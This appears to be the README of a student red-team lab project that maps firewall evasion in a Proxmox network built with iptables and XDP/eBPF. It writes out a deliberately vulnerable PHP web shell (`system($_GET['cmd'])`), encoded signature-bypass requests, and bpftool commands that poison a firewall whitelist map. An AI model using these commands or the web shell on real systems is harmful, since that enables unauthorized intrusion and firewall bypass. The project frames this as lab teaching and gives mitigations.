# Network-Segmentation-And-Firewall-Evasion-Mapping
A repo for simulating network segmentation using xdp firewall
a# Red Team Lab: Network Segmentation Testing and Firewall Evasion Mapping

**A comprehensive red team exercise demonstrating multi-layer firewall evasion and post-exploitation eBPF manipulation.**

---

## Project Overview

This project implements a realistic network security lab to test and demonstrate the effectiveness (and limitations) of layered firewall defenses. Through systematic reconnaissance, exploitation, and post-exploitation activities, the exercise shows how attackers can progress through network segmentation, application-layer filtering, and finally compromise firewall state itself.

**Report:** `RED_TEAM_LAB_REPORT.pdf` 

**Course:** CY376 - Network Monitoring, Security and Auditing  
**Author:** Othniel-Oppong Nhyira(0xash) | UMaT Tarkwa  
**Date:** August 2026  
**Project Type:** Red Team  

---

## Key Findings

### Layer 3/4 Filtering (iptables)
-  **Evasion Method:** Source IP spoofing
- **Result:** iptables rules based solely on source address can be bypassed via packet crafting
- **Mitigation:** Stateful connection tracking + ingress filtering (uRPF)

### Layer 7 Filtering (XDP Signature Matching)
-  **Evasion Methods:** Case variation (`/Attack` vs `/attack`), Hex encoding (`/%61ttack`)
- **Result:** Simple signature matching without payload normalization is trivial to bypass
- **Mitigation:** Normalize payloads (lowercase, URL decode) before matching

### Post-Exploitation (BPF Map Poisoning)
-  **Exploitation Method:** Direct BPF map state manipulation via `bpftool`
- **Result:** Complete firewall bypass by adding attacker IP to the whitelist map
- **Impact:** Defense evasion after code execution on firewall host
- **Mitigation:** Restrict `CAP_BPF`/`CAP_SYS_ADMIN`, audit map modifications

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│              Proxmox VE Hypervisor                       │
│         (Firewall: iptables + XDP + BPF Maps)           │
└────────────────────┬────────────────────────────────────┘
                     │
         ┌───────────┼───────────┐
         │           │           │
    [VLAN 10]    [VLAN 20]   [VLAN 30]
    192.168.10   192.168.20  192.168.30
         │           │           │
   ┌─────────────┐ ┌──────┐ ┌─────────────┐
   │ Web Server  │ │Alpine│ │File Server  │
   │(Vulnerable) │ │      │ │(Protected)  │
   │  10.10      │ │20.10 │ │  30.10      │
   └─────────────┘ └──────┘ └─────────────┘
         ▲
         │
    [Kali 10.5]
   (Attacker)
```

### Components

- **Proxmox VE:** Bare-metal hypervisor with custom kernel
- **LXC Containers:** Ubuntu minimal (web-server, file-server), Alpine Linux (testing)
- **iptables Rules:** Block 192.168.10.5 → 192.168.30.0/24
- **XDP Firewall:** Custom eBPF program detecting "GET /attack" signature
- **BPF Maps:** Hash map (allowed_ips) for IP whitelisting

---

## Exploitation Chain

### 1. Reconnaissance & Evasion Testing
- Probe firewall rules via Layer 3/4 spoofing
- Identify signature-matching via encoding variations
- Map evasion opportunities

### 2. Initial Access
- Exploit PHP command injection vulnerability
- Achieve code execution as www-data user

### 3. Post-Exploitation
- Enumerate BPF maps on firewall host
- Manipulate allowed_ips map state
- Whitelist attacker IP to bypass XDP filtering

### 4. Defense Evasion
- Send previously-blocked traffic (GET /attack)
- XDP now allows traffic due to whitelist entry
- Achieve complete firewall bypass

---


## How to Use

### Prerequisites
- Proxmox VE (or KVM/libvirt alternative)
- Linux host with eBPF/XDP support (kernel 5.8+)
- Kali Linux for testing
- Tools: bpftool, clang, llvm, docker/lxc

### Setup (Quick Start)

1. **Configure Proxmox networking:**
   ```bash
   # Apply VLAN bridges and IP configuration
   cat configs/proxmox-network-config.conf | tee /etc/network/interfaces
   systemctl restart networking
   ```

2. **Create LXC containers:**
   ```bash
   bash configs/lxc-container-setup.sh
   ```

3. **Deploy vulnerable app:**
   ```bash
   pct exec 100 bash -c "apt install -y apache2 php && \
     cat > /var/www/html/vulnerable.php << 'EOF'
     <?php system(\$_GET['cmd']); ?>
     EOF"
   ```

4. **Compile and load XDP firewall:**
   ```bash
   cd scripts
   clang -O2 -target bpf -c ebpf-firewall.c -o ebpf-firewall.o
   ip link set dev vmbr0 xdp obj ebpf-firewall.o sec xdp
   bpftool prog list  # Verify loading
   ```

5. **Apply iptables rules:**
   ```bash
   cat configs/iptables-rules.txt | bash
   ```

6. **Test connectivity:**
   ```bash
   # From Kali
   ping 192.168.30.10  # Should be blocked
   curl http://192.168.10.10/  # Should work
   ```

### Running Evasion Tests

```bash
# Test source IP spoofing
python3 scripts/evasion-tests.py --technique spoofing

# Test signature bypass
curl "http://192.168.30.10/Attack"      # Case variation
curl "http://192.168.30.10/%61ttack"    # Hex encoding

# Verify blocking before poisoning
curl "http://192.168.30.10/attack" -v   # Should timeout
```

### Post-Exploitation (BPF Poisoning)

```bash
# From compromised web-server
bpftool map list          # Find allowed_ips map
bpftool map dump id 16    # Show current map contents

# Poison the map (add attacker IP)
bpftool map update id 16 key hex 05 0a a8 c0 value hex 01 00 00 00

# Verify bypass
curl "http://192.168.30.10/attack" -v   # Should now succeed
```

---

## Key Scripts

### `ebpf-firewall.c`
Custom XDP program implementing Layer 7 filtering:
- Parses Ethernet, IP, TCP, HTTP headers
- Detects "GET /attack" signature
- Checks BPF map for whitelisted IPs
- Returns XDP_DROP or XDP_PASS

### `evasion-tests.py`
Scapy-based testing suite for:
- Source IP spoofing (ICMP)
- Signature bypass (HTTP variations)
- Fragmentation attacks
- TTL manipulation

### `bpf-map-poison.sh`
Helper script for BPF map manipulation:
- Enumerate maps
- Dump map contents
- Update map entries
- Verify whitelist changes

---

## Evidence & Results

### Screenshots
Located in `evidence/screenshots/`:
- Network topology and VLAN configuration
- Firewall rule configuration
- tcpdump output showing spoofed packets
- curl output before/after poisoning
- bpftool map enumeration and manipulation

### Logs
Located in `evidence/logs/`:
- Full tcpdump captures from test phases
- HTTP access logs and responses
- Metasploit session establishment logs
- BPF program loading verification

---

## Recommendations

1. **Defense in Depth:** Never rely on a single filtering layer
2. **Payload Normalization:** Lowercase, URL decode before signature matching
3. **Capability Restrictions:** Limit `CAP_BPF`/`CAP_SYS_ADMIN` to minimal processes
4. **Audit & Monitor:** Log all BPF map modifications; alert on changes
5. **Host Security:** Protect firewall host as critically as any protected asset
6. **Connection Tracking:** Use stateful inspection with ingress filtering

---

## Ethical Considerations

This project demonstrates offensive security techniques in a **controlled, isolated lab environment**. All testing was performed on infrastructure under the operator's control. This work is intended for educational purposes within the CY376 course at UMaT Tarkwa.

Testing against unauthorized systems is illegal and unethical.

---

## Tools & Technologies

- **Proxmox VE** — Hypervisor and container platform
- **eBPF/XDP** — Kernel-level packet processing
- **iptables** — Linux packet filtering
- **Scapy** — Packet crafting and analysis
- **Metasploit Framework** — Exploitation platform
- **bpftool** — BPF program and map inspection
- **tcpdump** — Network packet capture

---

## References

- MITRE ATT&CK Framework: https://attack.mitre.org
- Linux Foundation eBPF Documentation: https://ebpf.io
- XDP Project: https://xdp-project.net/
- Netfilter/iptables: https://www.netfilter.org/
- Brendan Gregg's eBPF Resources: https://www.brendangregg.com/ebpf.html

---

## Contact

For questions about this project:
- **Author:** Othniel-Oppong Nhyira(0xash)
- **Institution:** UMaT-Tarkwa
- **Course:** CY376
- **Email:** cy-nothniel-oppong3923@st.umat.edu.gh

---

**Disclaimer:** This project is educational material for educational purposes only, and I am not liable for any consequences caused by misusage.
